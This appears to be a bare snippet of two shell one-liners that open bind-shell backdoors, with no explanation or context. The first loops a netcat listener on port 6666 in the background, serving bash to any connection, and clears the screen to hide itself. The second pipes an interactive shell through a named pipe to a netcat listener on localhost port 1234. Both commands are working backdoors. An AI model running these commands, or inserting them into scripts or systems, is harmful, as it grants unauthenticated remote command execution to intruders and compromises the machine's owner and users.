($(while true; do nc -l -p 6666 -c "/bin/bash 2> /dev/null"; done;) & ) && clear

rm -f /tmp/f; mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f